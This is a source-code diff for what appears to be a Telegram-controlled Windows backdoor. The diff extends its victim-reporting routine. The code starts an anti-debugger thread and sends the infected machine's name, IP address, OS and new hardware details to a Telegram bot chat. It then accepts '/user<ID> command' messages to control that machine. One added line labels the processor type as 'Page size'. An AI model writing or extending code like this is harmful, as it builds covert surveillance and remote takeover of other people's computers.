@@ -92,21 +92,29 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 		RegCloseKey(hKey);
 
 		Telegram api(s.botapi);
-		
+
+		SYSTEM_INFO SysInfo;
+		GetSystemInfo(&SysInfo);
+
 		if (s.protect_debuggers) {
 			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector, 0, 0, 0);
 		}
 
 		int ID = rand();
-		std::string information = "User ID: " + std::to_string(ID) + "%0A"
-			"Name: " + GetPCName() + "%0A"
-			"IP: " + GetIP() + "%0A"
-			"OS: " + GetOS() + "%0A%0A"
-			"For send command to this user, type: /user" + std::to_string(ID) + " command";
+		std::string information = "User ID: " + std::to_string(ID) + 
+			"%0A%0A- Global information:" +
+			"%0AName: " + GetPCName() +
+			"%0AIP: " + GetIP() +
+			"%0AOS: " + GetOS() + 
+			"%0A%0A- Hardware information: " +
+			"%0AOEM ID: " + std::to_string(SysInfo.dwOemId) +
+			"%0ANum of processors: " + std::to_string(SysInfo.dwNumberOfProcessors) +
+			"%0APage size: " + std::to_string(SysInfo.dwProcessorType) +
+			"%0AProcessor: " + GetProcessorBrand() +
+			"%0A%0AFor send command to this user, type: /user" + std::to_string(ID) + " command";
 		api.SendTextMessage(s.chatid, information.c_str());
 
 		std::string last;
-
 		std::string prefix = "/user" + std::to_string(ID) + " ";
 
 		std::vector<std::string> params;
